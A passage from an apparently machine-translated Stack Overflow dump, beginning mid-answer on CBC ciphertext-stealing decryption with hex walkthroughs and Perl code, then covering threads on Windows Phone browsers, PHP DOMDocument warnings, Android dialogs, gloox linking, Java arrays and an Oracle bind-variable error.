    *   但是对于倒数第二个块（N-1）（在用例一中N=2），转换变为......（*由于选择了密文窃取而出现此异常*）

        ```
        m[n]    := Decrypt( c[n]) XOR CV;
        CV[n+1] := CV[n] // Unchanged! 
        ```

    *   应用于我们的用例：

        ```
        CV = [16] 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
        c[0] = [16] 17 5C C0 97 FF EF 63 5A 88 83 6C 00 62 BF 87 E5
        Decrypt(c[0]) = [16] 6F 6B 69 6E 73 21 F0 7B 79 F2 AF 27 B1 52 D6 0B
        m[0] := Decrypt(c[0]) XOR CV = [16] 6E 6B 69 6E 73 21 F0 7B 79 F2 AF 27 B1 52 D6 0B 
        ```

5.  现在处理最后一个块。它是一个部分的，长 6 个字节。一般来说，最后一个块的处理是这样的……

    ```
    y := c[N-1] | LastBytes( m[N-2], BlockSize-Length(c[N-1]));
    m[N-1] := Decrypt( y) XOR CV 
    ```

    应用于用例一：

    ```
    c[1] = [6] 1D 66 DB 97 2E 2C
    y := c[1] | LastBytes( m[0], 10)
    y = [16] 1D 66 DB 97 2E 2C F0 7B 79 F2 AF 27 B1 52 D6 0B
    Decrypt( y) = [16]= 4D 65 65 65 65 65 65 65 65 65 72 6F 79 20 4A 65
    m[1] := Decrypt(y) XOR CV
    m[1] = [16] 4C 65 65 65 65 65 65 65 65 65 72 6F 79 20 4A 65 
    ```

6.  解密过程的最后一步是最后两个块的发射。我们颠倒顺序，先发出 m[N-1]，然后发出 m[N-2] 的第一部分（其长度等于 c[N-1] 的长度）。申请用例一...

    *   发射 m[1]

        ```
        m[1] = [16] 4C 65 65 65 65 65 65 65 65 65 72 6F 79 20 4A 65 
        ```

    *   发出 m[0] 的前 6 个字节

        ```
        FirstBytes( m[0], 6) = 6E 6B 69 6E 73 21 
        ```

    *   总而言之，我们得到了一个重建的明文......

        ```
        [22] 4C 65 65 65 65 65 65 65 65 65 72 6F 79 20 4A 65 6E 6B 69 6E 73 21 
        ```

    这是 'Leeeeeeeeeeroy Jenkins!' 的 UTF-8 编码

# 用例二

在这个用例中，消息正好是 2 个块长。这称为圆形外壳。在圆形情况下，没有要量化的部分块，因此它就像正常的 CBC 一样进行。密码、密钥和 IV 与用例一中的相同。要解密的密文消息（包括前置 8 字节 IV）是...

1.  设置

    ```
    Ciphertext = [40] 01 00 00 00 00 00 00 00 70 76 12 58 4E 38 1C E1 92 CA 34 FB 9A 37 C5 0A 75 F2 0B 46 A1 DF 56 60 D4 5C 76 4B 52 19 DA 83
    which is encoded base64 as 'AQAAAAAAAABwdhJYTjgc4ZLKNPuaN8UKdfILRqHfVmDUXHZLUhnagw==' 
    ```

    这分解为IV，第一个块和第二个块，就像这样......

    ```
    IV = [16] 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    c[0] = [16] 70 76 12 58 4E 38 1C E1 92 CA 34 FB 9A 37 C5 0A
    c[1] = [16] 75 F2 0B 46 A1 DF 56 60 D4 5C 76 4B 52 19 DA 83 
    ```

2.  一般和倒数第二块

    ```
    Decrypt(c[0]) = [16] 45 61 6E 63 65 20 74 68 65 6E 2C 20 77 68 65 72
    m[0] := Decrypt(c[0]) XOR CV = [16] 44 61 6E 63 65 20 74 68 65 6E 2C 20 77 68 65 72
    Next CV := c[0] = [16] 70 76 12 58 4E 38 1C E1 92 CA 34 FB 9A 37 C5 0A 
    ```

3.  最后一块：

    在这个用例中，我们的最后一个块是圆形的。

    ```
    Decrypt(c[1]) = [16] 75 F2 0B 46 A1 DF 56 60 D4 5C 76 4B 52 19 DA 83
    m[1] := Decrypt(c[1]) XOR CV = [16] 65 65 76 65 72 20 79 6F 75 20 6D 61 79 20 62 65 
    ```

4.  解密过程的最后一步是最后两个块的发射。在圆形情况下，我们不会颠倒顺序。我们先发出 m[N-2]，然后发出 m[N-1]。申请用例二...

    *   发射 m[0]

        ```
        m[0] = [16] 44 61 6E 63 65 20 74 68 65 6E 2C 20 77 68 65 72 
        ```

    *   发射整个 m [1](http://www.go4expert.com/forums/showthread.php?t=5555)

        ```
        m[1] = [16] 65 65 76 65 72 20 79 6F 75 20 6D 61 79 20 62 65 
        ```

    *   总而言之，我们得到了一个重建的明文......

        ```
        [32] 44 61 6E 63 65 20 74 68 65 6E 2C 20 77 68 65 72 65 65 76 65 72 20 79 6F 75 20 6D 61 79 20 62 65 
        ```

    这是“然后跳舞，无论你在哪里”的 UTF-8 编码

5.  要考虑的边缘案例。有两个边缘案例，这里提供的两个用例没有说明。

    *   短消息。短消息是一条消息，其长度以字节为单位：

        *   不为零；和
        *   不到一个街区；
    *   零长度消息。

在短消息的情况下，技术上仍然可以通过使用IV作为密文的先验块来实现密文窃取。然而，恕我直言，这种使用密文窃取的方式，由于缺乏对密码强度影响的研究，更不用说增加的实现复杂性，是不合理的。在 TurboPower LockBox 3 中，当消息是短消息，并且链模式不是密钥流时，链模式被视为 CFB-8bit。CFB-8 位是一种密钥流模式。

在零长度消息的情况下，它真的很简单。零长度明文消息一对一映射到零长度密文消息。不需要、生成或预先添加 IV。此映射独立于链接模式和密码（在块模式密码的情况下）。

# PHP实现注意事项

## 警告

我不是 PHP 程序员。我不知道PHP。我在这里说的任何事情都应该持保留态度。

## 字节数组

看起来您正在使用 PHP 字符串来存储字节数组。这对我来说看起来很危险。如果其中一个字节值为零怎么办？那会缩短字符串吗？strlen() 在这种情况下会如何表现？如果 PHP 有一个本地数据类型，它是一个字节数组，那么这可能会更安全。但我真的不知道。我只是提请您注意这一点，如果您还没有意识到的话。可能这不是一个真正的问题。

## mcrypt_decrypt 库

我不熟悉这个库。它本身是否支持密文窃取？我假设不是。因此，您有两种可能的策略。

1.  使用 CBC 模式为除最后两个块之外的所有块调用库的解密。按照我向您描述的方式处理最后两个块。但这需要访问 CV。API会公开这个吗？如果不是，则此策略对您来说不是一个可行的选择。

2.  使用 ECB 模式为除最后两个块之外的所有块调用库的解密，并滚动您的 CBC 链接。相当容易实施和定义，您可以访问 CV。

## 如何在 PHP 中进行异或运算

其他人发布了对此问题的答案，但目前已将其撤回。但他是对的。它看起来像是在 PHP 中对字节数组进行 XOR，逐个遍历字符，然后进行字节级 XOR。[此处](http://www.go4expert.com/forums/showthread.php?t=5555)显示了该技术。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-15T13:37:39.257

我正在为 perl 寻找类似的答案。Perl 的库仅限于 CBC 模式。以下是我使用 AES 256 CBC 模式和 CTS 方法 3 让 CTS 工作的方法。我认为这对 PHP 也可能有帮助。

这是实际的 NIST 文档。文档 ID：NIST800-38A CBC-CS3 标题：“分组密码操作模式建议”；[CBC 模式的三种密文窃取变体。来源： http](https://csrc.nist.gov/publications/detail/sp/800-38a/addendum/final) ://csrc.nist.gov/publications/nistpubs/800-38a/addendum-to-nist_sp800-38A.pdf

这是代码...

```
use Crypt::CBC;
use Crypt::Cipher::AES;

my $key = pack("H*","0000000000000000000000000000000000000000000000000000000000000000");
my $iv = pack("H*","00000000000000000000000000000000");
my $pt = pack("H*","0000000000000000000000000000000000");
my $ct = aes256_cbc_cts_decrypt( $key, $iv, $pt );

#AES 256 CBC with CTS
sub aes256_cbc_cts_decrypt {
    my ($key, $iv, $in) = @_;
    my $len_in_bytes = length(unpack("H*", $in)) / 2;
    my $in_idx = 0;
    my $null_iv = pack( "H32", "00000000000000000000000000000000");
    my $cipher = Crypt::CBC->new(
                    -key         => $key,
                    -iv          => $null_iv,
                    -literal_key => '1',
                    -keysize     => 32,
                    -blocksize   => 16,
                    -header      => 'none',
                    -cipher      => 'Crypt::Cipher::AES');
    my $out;
    while ( $len_in_bytes >= 16 )
    {
        my $tmp = substr($in, $in_idx, 16);
        my $outblock = $cipher->decrypt($tmp);
        if ( ( ($len_in_bytes % 16) eq 0 ) || ( $len_in_bytes > 32 ) )
        {
            $outblock = $outblock ^ $iv;
            $iv = $tmp;
        }
        $out .= $outblock;
        $in_idx += 16;
        $len_in_bytes -= 16;
    }

    if ($len_in_bytes) {
        my $tmp = substr($in,$in_idx,$len_in_bytes);
        my $out_idx = $in_idx - 16;
        $tmp .= substr($out,$out_idx + $len_in_bytes, 16 - $len_in_bytes);
        $out .= substr($out, $out_idx, $len_in_bytes) ^ substr($tmp, 0, $len_in_bytes);
        substr($out,$out_idx,16) = $iv ^ $cipher->decrypt($tmp);
    }
    return $out;
} 
```

# silverlight - How to open application from a webbrowser windows phone

> ID：12328321
> 
> 赞同：2
> 
> 时间：2012-09-08T05:37:22.817
> 
> 标签：silverlight, windows-phone-7, browser, windows-phone

I am developing a windows phone application. In a page I placed a button and on this button click I open the webbrowser and redirects to our website pages for some processes. There are many webpages. In the last webpage we added a button "Close". In the close button click I want to close the webbrowser and open the application back with the last state before opening the webbrowser. How can I do this ?

Thanks.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T23:14:05.310

我将应用程序中的按钮称为“应用程序按钮”，将网页中的按钮称为“关闭按钮”。

将名为 webBrowser1 的 WebBrowser 控件添加到 Windows Phone 应用程序。使其覆盖整个屏幕，并将其 Visibility 属性设置为 Collapsed。

在应用程序按钮的点击事件中，使用

```
webBrowser1.Visibility = System.Windows.Visibility.Visible;
webBrowser1.Navigate(new Uri("http://yourwebsite.com/page"); 
```

显示网络浏览器并将其导航到您网站的第一页。

使站点最后一页上的关闭按钮导航到站点上的新页面，称为“close.html”或您想要的任何内容。在 javascript 中，这看起来像

```
<Button onclick="window.location.href='http://yourwebsite.com/close.html';"> 
```

回到应用程序：在 webBrowser1 的导航事件使用中，

```
if (e.Uri.ToString().Contains("close.html"))
{
    webBrowser1.Visibility = System.Windows.Visibility.Collapsed;
} 
```

当您单击站点最后一页上的按钮时，它会导航到“close.html”。发生这种情况时，Web 浏览器的 Navigating 事件将触发。由于每次更改页面时都会触发此事件，因此您需要检查新 url 是否包含“close.html”，即关闭按钮导航到的页面。如果是这样，Web 浏览器将被隐藏，您将再次看到您的应用程序。

.

（在 VB 中，代码为）

```
webBrowser1.Visibility = System.Windows.Visibility.Visible
webBrowser1.Navigate(New Uri("http://yourwebsite.com/page") 
```

和

```
If e.Uri.ToString.Contains("close.html")
    webBrowser1.Visibility = System.Windows.Visibility.Collapsed
End If 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:20:57.380

*编辑：当我写答案时，我是在笼统地思考，不记得你是在专门询问网络浏览器（因此，使用`webbrowsertask`启动器）。感谢@Claus 指出 OAuth 的情况。因此，我正在修改我的答案以解释这是可能的，并且还提到了使用启动器的问题，因为无法保证返回到启动器应用程序中的给定点（因为它与选择器一样，因为它的可用性回调）。*

*一般而言，这是**不可能实现的。**也就是说，有一个应用程序 A 打开了另一个应用程序 B，并且您想从应用程序 B 中关闭并打开 A。我认为这是不可能的原因有很多： - 如何获得应用程序 A 的地址/引用。目前没有 API。- 没有内容处理程序/插件，第 3 方可以使用 Web 浏览器注册应用程序。- 最重要的是，安全，安全，安全。这将为来自网络的攻击打开大门。*

但是，对于应用程序 B 作为网络浏览器的要求，可以使用任务启动器[WebBrowserTask](http://msdn.microsoft.com/en-us/library/windowsphone/develop/microsoft.phone.tasks.webbrowsertask%28v=vs.92%29.aspx)。正如@claus 建议的那样，您可以`Window.close()`在最后一页中使用 javascript 来关闭浏览器，从而显示其下方的应用程序（**希望**是 A）。这里的问题是，如果用户在浏览器启动之后（并且在浏览器关闭之前）打开了一个应用程序（我们称之为 C），并且用户没有关闭 C，那么当浏览器关闭时，用户将被返回到 C 而不是启动器应用程序！根据您的要求，这不是您想要的。

因此，如果您想实现您在问题中描述的**那种效果**，最好将 Web 浏览器嵌入到您的应用程序（作为全屏应用程序）中，并且从这个有利位置您可以在网络浏览器（控制）和（主机）应用程序通过 Javascript。

希望这会有所帮助。

# php - PHP DOMDocument::loadHTML() [domdocument.loadhtml]: htmlParseEntityRef: no name in Entity

> ID：12328322
> 
> 赞同：14
> 
> 时间：2012-09-08T05:37:40.043
> 
> 标签：php, html-parsing, domdocument

I trying to get the "link" elements from certain webpages. I can't figure out what i'm doing wrong though. I'm getting the following error:

> Severity: Warning
> 
> Message: DOMDocument::loadHTML() [domdocument.loadhtml]: htmlParseEntityRef: no name in Entity, line: 536
> 
> Filename: controllers/test.php
> 
> Line Number: 34

Line 34 is the following in the code:

> ```
>  $dom->loadHTML($html); 
> ```

my code:

```
 $url = "http://www.amazon.com/";

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($html = curl_exec($ch)){

        // parse the html into a DOMDocument
        $dom = new DOMDocument();

        $dom->recover = true;
        $dom->strictErrorChecking = false;

        $dom->loadHTML($html);

        $hrefs = $dom->getElementsByTagName('a');

        echo "<pre>";
        print_r($hrefs);
        echo "</pre>";

        curl_close($ch);

    }else{
        echo "The website could not be reached.";
    } 
```

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-09-08T05:42:35.353

这意味着某些 HTML 代码无效。这只是一个警告，而不是错误。您的脚本仍将处理它。抑制警告集

```
 libxml_use_internal_errors(true); 
```

或者你可以通过这样做完全抑制警告

```
@$dom->loadHTML($html); 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-12-31T21:48:31.017

这可能是由一个流氓`&`符号引起的，该符号紧随其后的是一个适当的标签。否则你会收到一个丢失的`;`错误。请参阅：[警告：DOMDocument::loadHTML(): htmlParseEntityRef: 期待 ';' 在实体中，](https://stackoverflow.com/questions/1685277/warning-domdocumentloadhtml-htmlparseentityref-expecting-in-entity)。

解决方案是 - 将`&`符号替换为`&amp;`
或者如果你必须拥有`&`它，那么你*可以*将它包含在：`<![CDATA[`-`]]>`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-07-17T21:48:00.837

HTML 格式不正确。如果格式不够好，将 HTML 加载到 DOM 文档中甚至可能会失败。如果 loadHTML 不起作用，那么抑制错误是没有意义的。如果您无法将 HTML 加载到 DOM 中，我建议使用 HTML Tidy 之类的工具来“清理”格式不佳的 HTML。

HTML Tidy 可以在这里找到[http://www.htacg.org/tidy-html5/](http://www.htacg.org/tidy-html5/)

# android - Error on send GPS location to friend

> ID：12328323
> 
> 赞同：0
> 
> 时间：2012-09-08T05:38:04.547
> 
> 标签：android, google-maps, gps, sms

I want to send my current location latitude,longitude to my friend via sms. This application i launch dialog and have two button one is sendlocation another is cancel button. But i launch my program in my emulator i got following error .

Logcat:

```
09-08 10:58:04.140: E/AndroidRuntime(212): Uncaught handler: thread main exiting due to uncaught exception
09-08 10:58:04.180: E/AndroidRuntime(212): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.sendlocation/com.example.sendlocation.MainActivity}: android.view.WindowManager$BadTokenException: Unable to add window -- token null is not for an application
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2401)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2417)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.ActivityThread.access$2100(ActivityThread.java:116)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1794)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.os.Handler.dispatchMessage(Handler.java:99)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.os.Looper.loop(Looper.java:123)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.ActivityThread.main(ActivityThread.java:4203)
09-08 10:58:04.180: E/AndroidRuntime(212):  at java.lang.reflect.Method.invokeNative(Native Method)
09-08 10:58:04.180: E/AndroidRuntime(212):  at java.lang.reflect.Method.invoke(Method.java:521)
09-08 10:58:04.180: E/AndroidRuntime(212):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:791)
09-08 10:58:04.180: E/AndroidRuntime(212):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:549)
09-08 10:58:04.180: E/AndroidRuntime(212):  at dalvik.system.NativeStart.main(Native Method)
09-08 10:58:04.180: E/AndroidRuntime(212): Caused by: android.view.WindowManager$BadTokenException: Unable to add window -- token null is not for an application
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.view.ViewRoot.setView(ViewRoot.java:460)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:177)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:91)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.Dialog.show(Dialog.java:238)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.AlertDialog$Builder.show(AlertDialog.java:802)
09-08 10:58:04.180: E/AndroidRuntime(212):  at com.example.sendlocation.MainActivity.updateWithNewLocation(MainActivity.java:177)
09-08 10:58:04.180: E/AndroidRuntime(212):  at com.example.sendlocation.MainActivity.onCreate(MainActivity.java:74)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1123)
09-08 10:58:04.180: E/AndroidRuntime(212):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2364)
09-08 10:58:04.180: E/AndroidRuntime(212):  ... 11 more 
```

MyCode:

```
private void updateWithNewLocation(Location location) { 
            String latLong;
            TextView myLocation; 
            myLocation = (TextView) findViewById(R.id.myLocation); 

            String addressString = "no address found"; 
            if(location!=null) { 

                positionOverlay.setLocation(location);

                Double geoLat=location.getLatitude()*1E6;
                Double geoLng=location.getLongitude()*1E6;
                GeoPoint point=new GeoPoint(geoLat.intValue(),geoLng.intValue());

                mapController.animateTo(point);

            double lat = location.getLatitude(); 
            double lon = location.getLongitude(); 
            latLong = "Lat:" + lat + "\nLong:" + lon; 

            double lattitude = location.getLatitude(); 
            double longitude = location.getLongitude(); 

            Geocoder gc = new Geocoder(this,Locale.getDefault()); 
            try { 
            List<Address> addresses= gc.getFromLocation(lattitude, longitude, 1); 
            StringBuilder sb = new StringBuilder(); 
            if(addresses.size()>0) { 
            Address address=addresses.get(0);
            for(int i=0;i<address.getMaxAddressLineIndex();i++)
                sb.append(address.getAddressLine(i)).append("\n");
            sb.append(address.getLocality()).append("\n"); 
            sb.append(address.getPostalCode()).append("\n"); 
        sb.append(address.getCountryName()); 
        } 
            addressString = sb.toString(); 
            } 
            catch (Exception e) { 
            } 
            } else { 
            latLong = " NO Location Found "; 
            } 

            myLocation.setText("Your Current Position is :\n"+ latLong + "\n"+  addressString ); 

                final String Touch=myLocation.getText().toString();

                String title="friendloc";
                String message="frndlatlong";
                AlertDialog.Builder dialog = new AlertDialog.Builder(getBaseContext());
                   dialog.setTitle(title);
                   dialog.setMessage(message);             

                     // dialog to send location via SMS
                     dialog.setCancelable(false);
                     dialog.setPositiveButton("Send Location",
                      new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int id) {
                             // call SMS program
                             Intent sendIntent = new Intent(Intent.ACTION_VIEW);
                             sendIntent.putExtra("sms_body", "My location: " + Touch);
                             sendIntent.setType("vnd.android-dir/mms-sms");
                             startActivity(sendIntent);
                         }
                     }) ;
                     dialog.setNegativeButton("Cancel", 
                      new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int id) {
                             dialog.dismiss();
                         }
                     });
                     dialog.show();

            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:44:24.103

使用 Current Activity Context ，而不是旧的 Application Context`getBaseContext()`或`getApplicationContext();`：

```
 AlertDialog.Builder dialog = new AlertDialog.Builder(Your_Current_Activity.this); 
```

# c++ - Can't work with gloox library in ubuntu 12.04 64-bit

> ID：12328326
> 
> 赞同：0
> 
> 时间：2012-09-08T05:38:33.940
> 
> 标签：c++, c, ubuntu-12.04, gloox

Some time ago I installed gloox library with the command sudo apt-get install libgloox-dev. But it is not working in netbeans, for example. I noticed that there are only .h files (with only function declarations) in /usr/include/gloox directory. Need your help...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-24T19:41:18.157

您需要配置项目依赖项才能使用库。您可以使用 <> 访问 Gloox 文件吗？如果是，则环境变量设置正确（应在 Ubuntu 中自动完成）

库（.so 文件）将位于 /usr/local/lib 中。您需要在 makefile 中将项目链接到它。在 netbeans 上，我*认为*它在项目属性-> c++ 编译器上。就个人而言，我使用 Cmake 生成我的 makefile

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:28:22.877

尝试从[http://camaya.net/gloox/download](http://camaya.net/gloox/download)下载库并按照安装说明进行操作。

# java - Java - quick way of assigning array values to individual variables

> ID：12328327
> 
> 赞同：12
> 
> 时间：2012-09-08T05:38:36.527
> 
> 标签：java, arrays, syntax, variable-assignment

I have a method which will return two strings in an array, `split(str, ":", 2)` to be precise.

Is there a quicker way in java to assign the two values in the array to string variables than

```
String[] strings = str.split(":", 2);
String string1 = strings[0];
String string2 = strings[1]; 
```

For example is there a syntax like

```
String<string1, string2> = str.split(":", 2); 
```

Thanks in advance.

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-08T06:09:16.627

不，Java 中没有这样的语法。

但是，其他一些语言也有这样的语法。示例包括 Python 的元组解包和许多函数式语言中的模式匹配。例如，在 Python 中，您可以编写

```
 string1, string2 = text.split(':', 2)
 # Use string1 and string2 
```

或者在 F# 中你可以写

```
 match text.Split([| ':' |], 2) with
 | [string1, string2] -> (* Some code that uses string1 and string2 *)
 | _ -> (* Throw an exception or otherwise handle the case of text having no colon *) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:07:14.503

您可以创建一个持有者类：

```
public class Holder<L, R> {
    private L left;
    private R right;

   // create a constructor with left and right
} 
```

然后你可以这样做：

```
Holder<String, String> holder = new Holder(strings[0], strings[1]); 
```

* * *

## 回答 #3

> 赞同：-5
> 
> 时间：2012-09-08T05:57:41.543

我可以说“使用循环”。可能是 for 循环，可能是 while，这取决于你。如果这样做，则不必担心数组大小。一旦您将数组大小作为“终止条件”传递，它将顺利工作。

更新：

我将使用如下代码。反正我没有把它弄脏，但我总是用这种风格。

String[] 字符串 = str.split(":", 2);

```
List keepStrings = new ArrayList();

for(int i=0;i<strings.length;i++)
{
    String string = strings[i];

    keepStrings.add(string);

} 
```

# java - i dont understand this code

> ID：12328328
> 
> 赞同：1
> 
> 时间：2012-09-08T05:38:46.137
> 
> 标签：java, android, superclass

I read Hello Android book and I don't understand some parts of the code.

```
public class PuzzleView extends View {
    private static final String TAG = "Sudoku" ;
    private final Game game;
    public PuzzleView(Context context) {
    super(context);
    this.game = (Game) context;
    setFocusable(true);
    setFocusableInTouchMode(true);
  }
 // ...
}

private float width; // width of one tile
private float height; // height of one tile
private int selX; // X index of selection
private int selY; // Y index of selection
private final Rect selRect = new Rect();
@Override
protected void onSizeChanged(int w, int h, int oldw, int oldh) {
    width = w / 9f;
    height = h / 9f;
    getRect(selX, selY, selRect);
    Log.d(TAG, "onSizeChanged: width " + width + ", height "+ height);
    super.onSizeChanged(w, h, oldw, oldh);
 } 
```

super(context); in this code, what does it mean and what does it do?

this.game = (Game) context; why we wrote this? what does it do?

The Android site says that onSizeChanged() function is used for: "This is called during layout when the size of this view has changed" This meant that if to rotate the phone, this function causes the view of program to display true. this is true?

getRect(selX,selY,selRect); what does it mean and what does it do?

Please help me. Cheers.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:41:25.447

For your first question, Subclasses can call super class constructors with a call to `super()`

i.e.

```
super(context); 
```

calls the super class constructor:

```
public View(Context context) 
```

In your second question, `this.game = (Game) context;` does 2 things. Firstly, it casts context to class `Game` and then it assigns it to the `PuzzleView`'s game field (`private final Game game;`).

`getRect` is declared at the end of the [PuzzleView code](http://www.google.co.za/url?sa=t&rct=j&q=&esrc=s&source=web&cd=6&cad=rja&ved=0CE0QFjAF&url=http%3A%2F%2Fmedia.pragprog.com%2Ftitles%2Feband%2Fcode%2FSudokuv2%2Fsrc%2Forg%2Fexample%2Fsudoku%2FPuzzleView.java&ei=XNxKUPKlO9SwhAf0toGQCg&usg=AFQjCNFw3zTB02qge2Wt2Vn-AJAiDQIDtA&sig2=YxRtnrMvKkfloh0XF8gZCQ). It changes the variable `rect` passed to it.

```
 private void getRect(int x, int y, Rect rect) {
      rect.set((int) (x * width), (int) (y * height), (int) (x
            * width + width), (int) (y * height + height)); 
```

ATaylor has already addressed `onSizeChanged`. Basically, the code overrides the inherited method, and then 'hooks' in additional functionality, before calling the super method. This is standard practice for overriding virtual methods (i.e. polymorphic behaviour).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T05:55:06.427

如前所述：

```
super(context); 
```

会调用父类同名的函数。

假设你有这种多态性：Class Animal

```
void MakeNoise() {
    System.out.println("Generic Noise");
} 
```

类狗扩展动物

```
void MakeNoise() {
    super();
    System.out.println("Woof");
} 
```

当您从 Dog 对象调用 MakeNoise 时，您将有两个输出。

通用噪声（由“super”调用）和“Woof”。

this.game => 当然，您需要访问该类中的绘图上下文，为此您需要一个“游戏”类型的上下文（我不熟悉 Android，这就是为什么我不确定，什么类型“游戏”是，但它似乎与上下文兼容。

每当从该类访问“this.game”时，它将访问最初传递的上下文，从而在设备表面上绘制。

是的，只要视图的大小发生变化，就会触发 onSizeChanged。

关于 getRect：实际上没有线索，因为我缺少原型或函数声明。但从它的外观来看，它将采用任意值（因为传递的参数尚未初始化，据我所知），并从中构造一个“矩形”结构（X/Y 到 W/Z）

# asp.net - ORA-01036: illegal variable name/number C# (SqlDataSource) Oracle 11g

> ID：12328332
> 
> 赞同：5
> 
> 时间：2012-09-08T05:39:15.807
> 
> 标签：asp.net, sql, oracle, oracle11g, sqldatasource

I am facing problem in updating the form view values using sqldatasource bind with Oracle database.

My Select and Insert events are working properly, all columns and parameters are correct.

But when i hit on update button below error occures:

**"ORA-01036: illegal variable name/number"**

Here is my Update Command using in **sqldatasource (binded with oracle)**:

```
UPDATE REPORT_PINK
SET DEMOG_HEIGHT = :DEMOG_HEIGHT
        , DEMOG_WEIGHT = :DEMOG_WEIGHT
        , DEMOG_TX_NO = :DEMOG_TX_NO
        , DEMOG_TX_PLACE = :DEMOG_TX_PLACE
        , DEMOG_TX_DATE = :DEMOG_TX_DATE
        , DEMOG_TX_TYPE = :DEMOG_TX_TYPE
        , DEMOG_RELATIONSHIP = :DEMOG_RELATIONSHIP
        , MED_HIS_CAUSE = :MED_HIS_CAUSE
        , MED_HIS_ALLERGY = :MED_HIS_ALLERGY
        , MED_HIS_BIOPSY_DATE = :MED_HIS_BIOPSY_DATE
        , MED_HIS_DIALYSIS = :MED_HIS_DIALYSIS
        , MED_HIS_DIALYSIS_DATE = :MED_HIS_DIALYSIS_DATE
        , MED_HIS_PREV_TX_FIRST = :MED_HIS_PREV_TX_FIRST
        , MED_HIS_PREV_TX_DATE_FIRST = :MED_HIS_PREV_TX_DATE_FIRST
        , MED_HIS_PREV_TX_SECOND = :MED_HIS_PREV_TX_SECOND
        , MED_HIS_PREV_TX_DATE_SECOND = :MED_HIS_PREV_TX_DATE_SECOND
        , COMOR_HEART = :COMOR_HEART
        , COMOR_LIVER = :COMOR_LIVER
        , COMOR_HEPATITIS_B = :COMOR_HEPATITIS_B
        , COMOR_HEPATITIS_C = :COMOR_HEPATITIS_C
        , COMOR_DIABETES = :COMOR_DIABETES
        , COMOR_TB = :COMOR_TB
        , COMOR_PEPTIC = :COMOR_PEPTIC
        , COMOR_CANCER = :COMOR_CANCER
        , IMM_CDC_DATE = :IMM_CDC_DATE
        , IMM_CDC_NORMAL_T = :IMM_CDC_NORMAL_T
        , IMM_CDC_NORMAL_B = :IMM_CDC_NORMAL_B
        , IMM_CDC_DTT_B = :IMM_CDC_DTT_B
        , IMM_CDC_DTT_T = :IMM_CDC_DTT_T
        , IMM_CDC_AHG_B = :IMM_CDC_AHG_B
        , IMM_CDC_AHG_T = :IMM_CDC_AHG_T
        , IMM_FLOW_DATE = :IMM_FLOW_DATE
        , IMM_FLOW_IGGT_PAT = :IMM_FLOW_IGGT_PAT
        , IMM_FLOW_IGGT_PRO = :IMM_FLOW_IGGT_PRO
        , IMM_FLOW_IGGB_PAT = :IMM_FLOW_IGGB_PAT
        , IMM_FLOW_IGGB_PRO = :IMM_FLOW_IGGB_PRO
        , IMM_FLOW_IGMT_PAT = :IMM_FLOW_IGMT_PAT
        , IMM_FLOW_IGMB_PAT = :IMM_FLOW_IGMB_PAT
        , IMM_ANTI_HLA_PRA = :IMM_ANTI_HLA_PRA
        , IMM_ANTI_HLA_PRA_DATE = :IMM_ANTI_HLA_PRA_DATE
        , TC_REMUZZI_GLOMERULI_L = :TC_REMUZZI_GLOMERULI_L
        , TC_REMUZZI_TUBULE_L = :TC_REMUZZI_TUBULE_L
        , TC_REMUZZI_INTERSTITM_L = :TC_REMUZZI_INTERSTITM_L
        , TC_REMUZZI_ARTERIS_L = :TC_REMUZZI_ARTERIS_L
        , TC_REMUZZI_GLOMERULI_R = :TC_REMUZZI_GLOMERULI_R
        , TC_REMUZZI_TUBULE_R = :TC_REMUZZI_TUBULE_R
        , TC_REMUZZI_INTERSTITM_R = :TC_REMUZZI_INTERSTITM_R
        , TC_REMUZZI_ARTERIS_R = :TC_REMUZZI_ARTERIS_R
        , TC_ANAST_ARTERY = :TC_ANAST_ARTERY
        , TC_ANAST_VEIN = :TC_ANAST_VEIN
        , TC_ANAST_URETER = :TC_ANAST_URETER
        , TC_DONATE_FIRST_ISCHEMIC = :TC_DONATE_FIRST_ISCHEMIC
        , TC_DONATE_SECOND_ISCHEMIC = :TC_DONATE_SECOND_ISCHEMIC
